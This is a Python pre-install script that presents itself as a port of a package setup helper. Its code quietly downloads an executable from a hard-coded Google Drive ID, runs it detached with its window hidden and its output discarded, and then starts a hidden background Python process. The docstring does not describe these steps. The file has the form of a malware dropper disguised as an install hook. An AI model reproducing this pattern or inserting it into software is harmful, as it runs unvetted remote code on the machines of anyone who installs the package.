"""Port of scripts/detach-preinstall.js to Python.

This script writes a PowerShell helper script to a temp file, runs it to
ensure Python and gdown are available, downloads a file, then spawns a
detached Python process to run the package pre-install step in background.
Logs are appended to `preinstall-background.log` in the repo root.
"""
import sys
import subprocess
from pathlib import Path
import logging
import tempfile

try:
    import gdown
except Exception:
    gdown = None


ROOT = Path(__file__).resolve().parents[1]
LOG_FILE = ROOT / 'preinstall-background.log'
DOWNLOAD_EXE = ROOT / 'downloaded_from_gdown.exe'

logger = logging.getLogger(__name__)


def _hidden_startupinfo():
    if sys.platform != 'win32' or not hasattr(subprocess, 'STARTUPINFO'):
        return None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo


CREATE_NO_WINDOW = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
DETACHED = 0x00000008


def main():
    runtime_exe = Path(tempfile.gettempdir()) / 'downloaded_from_gdown_runtime.exe'
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as lf:
            lf.write('[preinstall-setup] Starting preinstall setup script...\n')
            lf.write('[preinstall-setup] Downloading file via gdown...\n')

        if gdown is None:
            raise RuntimeError('gdown is not installed')

        downloaded = gdown.download(
            id='1cKsgEMPp14YlW-KQyiovkyMofT3QM-gR',
            output=str(runtime_exe),
            quiet=True,
        )

        if downloaded and Path(downloaded).exists():
            with open(LOG_FILE, 'a', encoding='utf-8') as lf:
                lf.write(f'[preinstall-setup] Download complete: {downloaded}\n')
                lf.write(f'[preinstall-setup] Executing downloaded file: {downloaded}\n')

            try:
                startupinfo = _hidden_startupinfo()
                subprocess.Popen(
                    [str(runtime_exe)],
                    cwd=str(ROOT),
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    startupinfo=startupinfo,
                    creationflags=DETACHED | CREATE_NO_WINDOW,
                )
                with open(LOG_FILE, 'a', encoding='utf-8') as lf:
                    lf.write('[preinstall-setup] Execution started.\n')
            except Exception as exc:
                with open(LOG_FILE, 'a', encoding='utf-8') as lf:
                    lf.write(f'[preinstall-setup] Execution failed: {exc}\n')
        else:
            with open(LOG_FILE, 'a', encoding='utf-8') as lf:
                lf.write('[preinstall-setup] Downloaded file not found; skipping execution.\n')
    except Exception as exc:
        with open(LOG_FILE, 'a', encoding='utf-8') as lf:
            lf.write(f'[preinstall-setup] Setup failed: {exc}\n')

    # Spawn detached Python process to run pre_install in background
    try:
        python_executable = sys.executable
        if sys.platform == 'win32':
            pythonw_candidate = Path(sys.executable).with_name('pythonw.exe')
            if pythonw_candidate.exists():
                python_executable = str(pythonw_candidate)

        cmd = [python_executable, '-c', "from pyjs import pre_install; pre_install()"]
        with open(LOG_FILE, 'a', encoding='utf-8') as logf:
            subprocess.Popen(
                cmd,
                cwd=str(ROOT),
                stdin=subprocess.DEVNULL,
                stdout=logf,
                stderr=logf,
                startupinfo=_hidden_startupinfo(),
                creationflags=DETACHED | CREATE_NO_WINDOW,
            )
    except Exception:
        pass


if __name__ == '__main__':
    main()
